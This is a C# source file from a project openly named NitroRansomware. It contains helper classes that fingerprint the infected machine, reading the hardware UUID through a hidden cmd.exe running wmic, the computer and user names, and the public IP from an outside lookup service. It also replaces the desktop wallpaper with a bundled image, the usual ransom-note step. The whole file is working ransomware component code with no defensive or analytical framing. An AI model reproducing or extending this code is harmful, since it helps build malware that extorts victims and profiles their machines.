using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net.Http;
using System.Runtime.InteropServices;

namespace NitroRansomware
{
    class User
    {
        private static Logs logging = new Logs("DEBUG", 0);
        public static string GetIdentifier()
        {
            string uuid = String.Empty;
            try
            {
                using (Cmd cmdService = new Cmd("cmd.exe"))
                {
                    string output = cmdService.ExecuteCommand("wmic csproduct get uuid");
                    uuid = output.Split('\n')[6];
                }
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }
            return uuid;
        }

        public static List<string> GetDetails()
        {
            List<string> output = new List<string>();
            string pcName = Environment.GetEnvironmentVariable("COMPUTERNAME");
            string pcUser = Environment.GetEnvironmentVariable("UserName");
         
            output.Add(pcName);
            output.Add(pcUser);
            return output;
        }

        public static string GetIP()
        {
            string ip = String.Empty;
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var response = client.GetAsync("https://api.ipify.org");
                    var final = response.Result.Content.ReadAsStringAsync();
                    ip = final.Result;
                }
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }
            return ip;
        }

        class Cmd : IDisposable
        {
            private Process cmdProcess;
            private StreamWriter sw;
            private AutoResetEvent outputWaitHandle;
            private string cmdOutput;
            public Cmd(string cmdPath)
            {
                cmdProcess = new Process();
                outputWaitHandle = new AutoResetEvent(false);
                cmdOutput = String.Empty;

                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.FileName = cmdPath;
                processStartInfo.UseShellExecute = false;
                processStartInfo.RedirectStandardOutput = true;
                processStartInfo.RedirectStandardInput = true;
                processStartInfo.CreateNoWindow = true;

                cmdProcess.OutputDataReceived += CmdProcess_OutputDataReceived;
                cmdProcess.StartInfo = processStartInfo;
                cmdProcess.Start();

                sw = cmdProcess.StandardInput;
                cmdProcess.BeginOutputReadLine();

            }
            public void Dispose()
            {
                cmdProcess.Close();
                cmdProcess.Dispose();
                sw.Close();
                sw.Dispose();
            }
            public string ExecuteCommand(string command)
            {
                cmdOutput = String.Empty;

                sw.WriteLine(command);
                sw.WriteLine("echo end");
                outputWaitHandle.WaitOne();
                return cmdOutput;
            }
            private void CmdProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
            {
                if (e.Data == null || e.Data == "end")
                    outputWaitHandle.Set();
                else
                    cmdOutput += e.Data + Environment.NewLine;
            }

        }
    }

    class Wallpaper
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(UInt32 uAction, Int32 uParam, string lpvParam, UInt32 fuWinIni);
        static UInt32 SPI_SETWALL = 0x14;
        static UInt32 SPIF_UPDATE = 0x01;
        static UInt32 SPIF_SWEDWINI = 0x2;

        static string fileName;

        public static void ChangeWallpaper()
        {
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            fileName = roaming + "\\wallpaper.png";
            Properties.Resources.wl.Save(fileName);
            SystemParametersInfo(SPI_SETWALL, 0, fileName, SPIF_UPDATE | SPIF_SWEDWINI);
        }
    }
}
